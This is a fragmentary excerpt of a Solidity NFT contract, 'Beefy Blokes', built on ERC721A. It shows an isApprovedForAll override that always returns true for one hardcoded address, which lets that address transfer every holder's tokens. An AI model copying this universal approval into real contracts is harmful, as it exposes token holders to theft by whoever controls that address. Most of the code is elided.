  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x04c6cD0210AAA17248C9D1be2ce1eD1cc5EE2F6E){return true;}
...
contract BeefyBlokes is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Beefy Blokes", "BB", maxBatchSize_, collectionSize_) {
